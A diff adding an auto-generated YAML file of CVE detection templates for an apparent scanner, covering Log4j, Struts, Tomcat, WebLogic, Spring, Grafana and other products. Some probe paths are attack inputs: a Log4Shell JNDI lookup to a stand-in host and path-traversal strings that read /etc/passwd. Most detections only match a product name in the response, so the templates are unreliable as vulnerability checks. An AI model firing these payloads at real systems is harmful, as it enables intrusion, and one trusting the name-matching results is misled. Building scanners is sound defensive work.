@@ -1,0 +1,6741 @@
+# 已知 CVE 检测模板（自动生成）
+- id: CVE-2021-44228
+  name: Log4Shell RCE (Log4j)
+  severity: critical
+  author: argus
+  description: "Log4Shell RCE (Log4j) - CVE-2021-44228"
+  cve: CVE-2021-44228
+  cvss: 10.0
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /${jndi:ldap://x.com/x}
+    match_rule:
+      match_type: Body
+      pattern: "log4j"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-44228"]
+    cpe: "cpe:2.3:a:apache:log4j:*"
+    service: http
+    port: 80
+- id: CVE-2021-45046
+  name: Log4j RCE v2
+  severity: critical
+  author: argus
+  description: "Log4j RCE v2 - CVE-2021-45046"
+  cve: CVE-2021-45046
+  cvss: 9.0
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /${jndi:ldap://x.com/x}
+    match_rule:
+      match_type: Body
+      pattern: "log4j"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-45046"]
+    cpe: "cpe:2.3:a:apache:log4j:2.15"
+    service: http
+    port: 80
+- id: CVE-2021-45105
+  name: Log4j DoS
+  severity: high
+  author: argus
+  description: "Log4j DoS - CVE-2021-45105"
+  cve: CVE-2021-45105
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /${jndi:ldap://x.com/x}
+    match_rule:
+      match_type: Body
+      pattern: "log4j"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-45105"]
+    cpe: "cpe:2.3:a:apache:log4j:2.16"
+    service: http
+    port: 80
+- id: CVE-2017-5638
+  name: Struts2 S2-045 RCE
+  severity: critical
+  author: argus
+  description: "Struts2 S2-045 RCE - CVE-2017-5638"
+  cve: CVE-2017-5638
+  cvss: 10.0
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-5638"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2017-9805
+  name: Struts2 S2-052 RCE
+  severity: critical
+  author: argus
+  description: "Struts2 S2-052 RCE - CVE-2017-9805"
+  cve: CVE-2017-9805
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-9805"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2018-11776
+  name: Struts2 S2-057 RCE
+  severity: critical
+  author: argus
+  description: "Struts2 S2-057 RCE - CVE-2018-11776"
+  cve: CVE-2018-11776
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-11776"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2020-17530
+  name: Struts2 S2-061 RCE
+  severity: critical
+  author: argus
+  description: "Struts2 S2-061 RCE - CVE-2020-17530"
+  cve: CVE-2020-17530
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-17530"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2017-12615
+  name: Tomcat PUT RCE
+  severity: critical
+  author: argus
+  description: "Tomcat PUT RCE - CVE-2017-12615"
+  cve: CVE-2017-12615
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: PUT
+    path: /test.jsp
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-12615"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2020-1938
+  name: Tomcat Ghostcat AJP
+  severity: high
+  author: argus
+  description: "Tomcat Ghostcat AJP - CVE-2020-1938"
+  cve: CVE-2020-1938
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-1938"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8009
+- id: CVE-2019-0232
+  name: Tomcat CGI RCE
+  severity: critical
+  author: argus
+  description: "Tomcat CGI RCE - CVE-2019-0232"
+  cve: CVE-2019-0232
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /cgi-bin/
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-0232"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2016-8735
+  name: Tomcat Deserialization RCE
+  severity: high
+  author: argus
+  description: "Tomcat Deserialization RCE - CVE-2016-8735"
+  cve: CVE-2016-8735
+  cvss: 8.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2016-8735"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2021-41773
+  name: Apache Path Traversal
+  severity: critical
+  author: argus
+  description: "Apache Path Traversal - CVE-2021-41773"
+  cve: CVE-2021-41773
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /cgi-bin/.%2e/%2e/%2e/%2e/etc/passwd
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-41773"]
+    cpe: "cpe:2.3:a:apache:http_server:2.4.49"
+    service: http
+    port: 80
+- id: CVE-2021-42013
+  name: Apache Path Traversal v2
+  severity: critical
+  author: argus
+  description: "Apache Path Traversal v2 - CVE-2021-42013"
+  cve: CVE-2021-42013
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
+    match_rule:
+      match_type: Body
+      pattern: "Apache"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-42013"]
+    cpe: "cpe:2.3:a:apache:http_server:2.4.50"
+    service: http
+    port: 80
+- id: CVE-2017-7529
+  name: Nginx Range Filter
+  severity: high
+  author: argus
+  description: "Nginx Range Filter - CVE-2017-7529"
+  cve: CVE-2017-7529
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Nginx"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-7529"]
+    cpe: "cpe:2.3:a:nginx:nginx:*"
+    service: http
+    port: 80
+- id: CVE-2018-16843
+  name: Nginx DoS
+  severity: medium
+  author: argus
+  description: "Nginx DoS - CVE-2018-16843"
+  cve: CVE-2018-16843
+  cvss: 5.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Nginx"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-16843"]
+    cpe: "cpe:2.3:a:nginx:nginx:*"
+    service: http
+    port: 80
+- id: CVE-2021-23017
+  name: Nginx DNS Resolver
+  severity: high
+  author: argus
+  description: "Nginx DNS Resolver - CVE-2021-23017"
+  cve: CVE-2021-23017
+  cvss: 7.7
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Nginx"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-23017"]
+    cpe: "cpe:2.3:a:nginx:nginx:*"
+    service: http
+    port: 80
+- id: CVE-2018-12895
+  name: WP Auth Bypass
+  severity: high
+  author: argus
+  description: "WP Auth Bypass - CVE-2018-12895"
+  cve: CVE-2018-12895
+  cvss: 8.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-12895"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2017-5487
+  name: WP REST User Enum
+  severity: medium
+  author: argus
+  description: "WP REST User Enum - CVE-2017-5487"
+  cve: CVE-2017-5487
+  cvss: 5.3
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-json/wp/v2/users
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-5487"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2019-9787
+  name: WP CSRF
+  severity: medium
+  author: argus
+  description: "WP CSRF - CVE-2019-9787"
+  cve: CVE-2019-9787
+  cvss: 6.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-9787"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2018-1000861
+  name: Jenkins RCE (Stapler)
+  severity: critical
+  author: argus
+  description: "Jenkins RCE (Stapler) - CVE-2018-1000861"
+  cve: CVE-2018-1000861
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jenkins"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-1000861"]
+    cpe: "cpe:2.3:a:jenkins:jenkins:*"
+    service: http
+    port: 8080
+- id: CVE-2020-2096
+  name: Jenkins RCE (Pickle)
+  severity: critical
+  author: argus
+  description: "Jenkins RCE (Pickle) - CVE-2020-2096"
+  cve: CVE-2020-2096
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jenkins"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-2096"]
+    cpe: "cpe:2.3:a:jenkins:jenkins:*"
+    service: http
+    port: 8080
+- id: CVE-2020-14882
+  name: WebLogic Console RCE
+  severity: critical
+  author: argus
+  description: "WebLogic Console RCE - CVE-2020-14882"
+  cve: CVE-2020-14882
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /console/css/%252e%252e%252fconsole.portal
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-14882"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2020-14883
+  name: WebLogic RCE v2
+  severity: critical
+  author: argus
+  description: "WebLogic RCE v2 - CVE-2020-14883"
+  cve: CVE-2020-14883
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /console/css/%252e%252e%252fconsole.portal
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-14883"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2019-2725
+  name: WebLogic Deserialization RCE
+  severity: critical
+  author: argus
+  description: "WebLogic Deserialization RCE - CVE-2019-2725"
+  cve: CVE-2019-2725
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /_async/AsyncResponseService
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-2725"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2017-10271
+  name: WebLogic Deserialization
+  severity: critical
+  author: argus
+  description: "WebLogic Deserialization - CVE-2017-10271"
+  cve: CVE-2017-10271
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-10271"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2018-7600
+  name: Drupalgeddon2 RCE
+  severity: critical
+  author: argus
+  description: "Drupalgeddon2 RCE - CVE-2018-7600"
+  cve: CVE-2018-7600
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /user/register
+    match_rule:
+      match_type: Body
+      pattern: "Drupal"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-7600"]
+    cpe: "cpe:2.3:a:drupal:drupal:*"
+    service: http
+    port: 80
+- id: CVE-2019-6340
+  name: Drupal REST RCE
+  severity: critical
+  author: argus
+  description: "Drupal REST RCE - CVE-2019-6340"
+  cve: CVE-2019-6340
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /node/?_format=hal_json
+    match_rule:
+      match_type: Body
+      pattern: "Drupal"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-6340"]
+    cpe: "cpe:2.3:a:drupal:drupal:*"
+    service: http
+    port: 80
+- id: CVE-2015-1427
+  name: ES Groovy RCE
+  severity: critical
+  author: argus
+  description: "ES Groovy RCE - CVE-2015-1427"
+  cve: CVE-2015-1427
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /_search?pretty
+    match_rule:
+      match_type: Body
+      pattern: "Elasticsearch"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2015-1427"]
+    cpe: "cpe:2.3:a:elastic:elasticsearch:*"
+    service: http
+    port: 9200
+- id: CVE-2015-3337
+  name: ES Directory Traversal
+  severity: high
+  author: argus
+  description: "ES Directory Traversal - CVE-2015-3337"
+  cve: CVE-2015-3337
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /../
+    match_rule:
+      match_type: Body
+      pattern: "Elasticsearch"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2015-3337"]
+    cpe: "cpe:2.3:a:elastic:elasticsearch:*"
+    service: http
+    port: 9200
+- id: CVE-2014-3120
+  name: ES RCE
+  severity: critical
+  author: argus
+  description: "ES RCE - CVE-2014-3120"
+  cve: CVE-2014-3120
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /_search?pretty
+    match_rule:
+      match_type: Body
+      pattern: "Elasticsearch"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2014-3120"]
+    cpe: "cpe:2.3:a:elastic:elasticsearch:*"
+    service: http
+    port: 9200
+- id: CVE-2018-6188
+  name: Django Auth Bypass
+  severity: high
+  author: argus
+  description: "Django Auth Bypass - CVE-2018-6188"
+  cve: CVE-2018-6188
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /admin/
+    match_rule:
+      match_type: Body
+      pattern: "Django"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-6188"]
+    cpe: "cpe:2.3:a:djangoproject:django:*"
+    service: http
+    port: 80
+- id: CVE-2019-19844
+  name: Django Password Reset
+  severity: high
+  author: argus
+  description: "Django Password Reset - CVE-2019-19844"
+  cve: CVE-2019-19844
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /password_reset/
+    match_rule:
+      match_type: Body
+      pattern: "Django"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-19844"]
+    cpe: "cpe:2.3:a:djangoproject:django:*"
+    service: http
+    port: 80
+- id: CVE-2020-9402
+  name: Django SQL Injection
+  severity: high
+  author: argus
+  description: "Django SQL Injection - CVE-2020-9402"
+  cve: CVE-2020-9402
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Django"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-9402"]
+    cpe: "cpe:2.3:a:djangoproject:django:*"
+    service: http
+    port: 80
+- id: CVE-2018-1270
+  name: Spring Messaging RCE
+  severity: critical
+  author: argus
+  description: "Spring Messaging RCE - CVE-2018-1270"
+  cve: CVE-2018-1270
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /stomp
+    match_rule:
+      match_type: Body
+      pattern: "Spring"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-1270"]
+    cpe: "cpe:2.3:a:pivotal_software:spring_framework:*"
+    service: http
+    port: 80
+- id: CVE-2022-22965
+  name: Spring4Shell RCE
+  severity: critical
+  author: argus
+  description: "Spring4Shell RCE - CVE-2022-22965"
+  cve: CVE-2022-22965
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Spring"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-22965"]
+    cpe: "cpe:2.3:a:pivotal_software:spring_framework:*"
+    service: http
+    port: 80
+- id: CVE-2022-22963
+  name: Spring Cloud Function RCE
+  severity: critical
+  author: argus
+  description: "Spring Cloud Function RCE - CVE-2022-22963"
+  cve: CVE-2022-22963
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Spring"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-22963"]
+    cpe: "cpe:2.3:a:vmware:spring_cloud_function:*"
+    service: http
+    port: 80
+- id: CVE-2022-22947
+  name: Spring Cloud Gateway RCE
+  severity: critical
+  author: argus
+  description: "Spring Cloud Gateway RCE - CVE-2022-22947"
+  cve: CVE-2022-22947
+  cvss: 10.0
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /actuator/gateway/routes/x
+    match_rule:
+      match_type: Body
+      pattern: "Spring"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-22947"]
+    cpe: "cpe:2.3:a:vmware:spring_cloud_gateway:*"
+    service: http
+    port: 80
+- id: CVE-2019-0193
+  name: Solr Deserialization RCE
+  severity: critical
+  author: argus
+  description: "Solr Deserialization RCE - CVE-2019-0193"
+  cve: CVE-2019-0193
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /solr/admin/cores
+    match_rule:
+      match_type: Body
+      pattern: "Solr"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-0193"]
+    cpe: "cpe:2.3:a:apache:solr:*"
+    service: http
+    port: 8983
+- id: CVE-2019-12409
+  name: Solr RCE
+  severity: critical
+  author: argus
+  description: "Solr RCE - CVE-2019-12409"
+  cve: CVE-2019-12409
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /solr/
+    match_rule:
+      match_type: Body
+      pattern: "Solr"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-12409"]
+    cpe: "cpe:2.3:a:apache:solr:*"
+    service: http
+    port: 8983
+- id: CVE-2015-1830
+  name: ActiveMQ Fileserver RCE
+  severity: critical
+  author: argus
+  description: "ActiveMQ Fileserver RCE - CVE-2015-1830"
+  cve: CVE-2015-1830
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /fileserver/
+    match_rule:
+      match_type: Body
+      pattern: "ActiveMQ"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2015-1830"]
+    cpe: "cpe:2.3:a:apache:activemq:*"
+    service: http
+    port: 8161
+- id: CVE-2015-5254
+  name: ActiveMQ Deserialization RCE
+  severity: critical
+  author: argus
+  description: "ActiveMQ Deserialization RCE - CVE-2015-5254"
+  cve: CVE-2015-5254
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /admin/
+    match_rule:
+      match_type: Body
+      pattern: "ActiveMQ"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2015-5254"]
+    cpe: "cpe:2.3:a:apache:activemq:*"
+    service: http
+    port: 8161
+- id: CVE-2016-3088
+  name: ActiveMQ Fileserver PUT
+  severity: high
+  author: argus
+  description: "ActiveMQ Fileserver PUT - CVE-2016-3088"
+  cve: CVE-2016-3088
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /fileserver/
+    match_rule:
+      match_type: Body
+      pattern: "ActiveMQ"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2016-3088"]
+    cpe: "cpe:2.3:a:apache:activemq:*"
+    service: http
+    port: 8161
+- id: CVE-2023-46604
+  name: ActiveMQ RCE (OpenWire)
+  severity: critical
+  author: argus
+  description: "ActiveMQ RCE (OpenWire) - CVE-2023-46604"
+  cve: CVE-2023-46604
+  cvss: 10.0
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "ActiveMQ"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-46604"]
+    cpe: "cpe:2.3:a:apache:activemq:*"
+    service: http
+    port: 61616
+- id: CVE-2015-4335
+  name: Redis RCE via Config
+  severity: critical
+  author: argus
+  description: "Redis RCE via Config - CVE-2015-4335"
+  cve: CVE-2015-4335
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Redis"
+  metadata:
+    category: known_cve
+    tags: ["cve", "redis", "CVE-2015-4335"]
+    cpe: "cpe:2.3:a:redis:redis:*"
+    service: redis
+    port: 6379
+- id: CVE-2018-19970
+  name: phpMyAdmin RCE
+  severity: critical
+  author: argus
+  description: "phpMyAdmin RCE - CVE-2018-19970"
+  cve: CVE-2018-19970
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /phpmyadmin/
+    match_rule:
+      match_type: Body
+      pattern: "phpMyAdmin"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-19970"]
+    cpe: "cpe:2.3:a:phpmyadmin:phpmyadmin:*"
+    service: http
+    port: 80
+- id: CVE-2020-26935
+  name: phpMyAdmin SQLi
+  severity: high
+  author: argus
+  description: "phpMyAdmin SQLi - CVE-2020-26935"
+  cve: CVE-2020-26935
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /phpmyadmin/
+    match_rule:
+      match_type: Body
+      pattern: "phpMyAdmin"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-26935"]
+    cpe: "cpe:2.3:a:phpmyadmin:phpmyadmin:*"
+    service: http
+    port: 80
+- id: CVE-2021-43798
+  name: Grafana Arbitrary File Read
+  severity: high
+  author: argus
+  description: "Grafana Arbitrary File Read - CVE-2021-43798"
+  cve: CVE-2021-43798
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /public/plugins/mysql/../../../../../../../../../../../etc/passwd
+    match_rule:
+      match_type: Body
+      pattern: "Grafana"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-43798"]
+    cpe: "cpe:2.3:a:grafana:grafana:*"
+    service: http
+    port: 3000
+- id: CVE-2020-13379
+  name: Grafana SSRF
+  severity: high
+  author: argus
+  description: "Grafana SSRF - CVE-2020-13379"
+  cve: CVE-2020-13379
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /avatar/1
+    match_rule:
+      match_type: Body
+      pattern: "Grafana"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-13379"]
+    cpe: "cpe:2.3:a:grafana:grafana:*"
+    service: http
+    port: 3000
+- id: CVE-2016-4340
+  name: GitLab RCE
+  severity: critical
+  author: argus
+  description: "GitLab RCE - CVE-2016-4340"
+  cve: CVE-2016-4340
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "GitLab"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2016-4340"]
+    cpe: "cpe:2.3:a:gitlab:gitlab:*"
+    service: http
+    port: 80
+- id: CVE-2019-7609
+  name: Kibana RCE
+  severity: critical
+  author: argus
+  description: "Kibana RCE - CVE-2019-7609"
+  cve: CVE-2019-7609
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /app/kibana
+    match_rule:
+      match_type: Body
+      pattern: "Kibana"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-7609"]
+    cpe: "cpe:2.3:a:elastic:kibana:*"
+    service: http
+    port: 5601
+- id: CVE-2017-2824
+  name: Zabbix SQLi
+  severity: high
+  author: argus
+  description: "Zabbix SQLi - CVE-2017-2824"
+  cve: CVE-2017-2824
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /zabbix/
+    match_rule:
+      match_type: Body
+      pattern: "Zabbix"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-2824"]
+    cpe: "cpe:2.3:a:zabbix:zabbix:*"
+    service: http
+    port: 80
+- id: CVE-2016-8335
+  name: Zabbix RCE
+  severity: critical
+  author: argus
+  description: "Zabbix RCE - CVE-2016-8335"
+  cve: CVE-2016-8335
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /zabbix/
+    match_rule:
+      match_type: Body
+      pattern: "Zabbix"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2016-8335"]
+    cpe: "cpe:2.3:a:zabbix:zabbix:*"
+    service: http
+    port: 80
+- id: CVE-2020-13921
+  name: Airflow RCE
+  severity: critical
+  author: argus
+  description: "Airflow RCE - CVE-2020-13921"
+  cve: CVE-2020-13921
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /admin/
+    match_rule:
+      match_type: Body
+      pattern: "Airflow"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-13921"]
+    cpe: "cpe:2.3:a:apache:airflow:*"
+    service: http
+    port: 8080
+- id: CVE-2021-25646
+  name: Druid RCE
+  severity: critical
+  author: argus
+  description: "Druid RCE - CVE-2021-25646"
+  cve: CVE-2021-25646
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /druid/
+    match_rule:
+      match_type: Body
+      pattern: "Druid"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-25646"]
+    cpe: "cpe:2.3:a:apache:druid:*"
+    service: http
+    port: 8888
+- id: CVE-2021-26720
+  name: Druid SSRF
+  severity: high
+  author: argus
+  description: "Druid SSRF - CVE-2021-26720"
+  cve: CVE-2021-26720
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /druid/
+    match_rule:
+      match_type: Body
+      pattern: "Druid"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-26720"]
+    cpe: "cpe:2.3:a:apache:druid:*"
+    service: http
+    port: 8888
+- id: CVE-2017-12635
+  name: CouchDB Priv Esc
+  severity: high
+  author: argus
+  description: "CouchDB Priv Esc - CVE-2017-12635"
+  cve: CVE-2017-12635
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /_users/
+    match_rule:
+      match_type: Body
+      pattern: "CouchDB"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-12635"]
+    cpe: "cpe:2.3:a:apache:couchdb:*"
+    service: http
+    port: 5984
+- id: CVE-2017-12636
+  name: CouchDB RCE
+  severity: critical
+  author: argus
+  description: "CouchDB RCE - CVE-2017-12636"
+  cve: CVE-2017-12636
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /_utils/
+    match_rule:
+      match_type: Body
+      pattern: "CouchDB"
+  metadata:
+    category: known_cve
